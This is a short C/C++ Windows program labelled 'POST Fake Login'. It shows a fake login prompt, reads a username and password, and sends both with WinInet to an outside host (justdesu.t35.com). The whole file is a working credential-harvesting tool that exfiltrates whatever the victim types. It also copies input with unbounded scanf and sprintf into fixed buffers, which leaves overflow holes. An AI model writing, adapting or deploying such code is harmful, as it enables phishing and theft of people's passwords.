#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <wininet.h>   

// We will use WinInet to connect to our site

// DO NOT FORGET TO LINK WININET LIBRARY TO THE PROJECT!!!

using namespace std;

int main(int argc, char *argv[])
{
    char uname[255], upass[255], request[255];
    
    printf("\n====================="); //Logo
    printf("\n======= 1stH ========");
    printf("\n== POST Fake Login ==");
    printf("\n=====================");
    
    printf("\n\n Enter username: ");   //Uname & Upass query
    scanf("%s", uname);
    printf("\n Enter password: ");
    scanf("%s", upass);
    
    //Initializing connection
    HINTERNET hInet = InternetOpen("User_Agent_Here", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    //Setting hostname, ports, etc    
    HINTERNET hHttp = InternetConnect(hInet, "justdesu.t35.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL,
                                      INTERNET_SERVICE_HTTP, NULL, NULL);
       
    sprintf(request, "index.php?name=%s&pass=%s", uname, upass); // Forming our POST request
    
    //Making request
    HINTERNET hHReq = HttpOpenRequest(hHttp, "POST", request, NULL, NULL, NULL,
			                          INTERNET_FLAG_NO_CACHE_WRITE, NULL);

    if(!HttpSendRequest(hHReq, NULL, 0, NULL, 0))  // Sending request
    {
     printf("\n   !!! Connection failure !!!\n");
     system("PAUSE");
     return EXIT_SUCCESS;
    }
    else {printf("\n   Connection successful.\n");}

    InternetCloseHandle(hHReq); // Closing our handles
    InternetCloseHandle(hHttp);
    InternetCloseHandle(hInet); 
    
    system("PAUSE");
    return EXIT_SUCCESS;
}
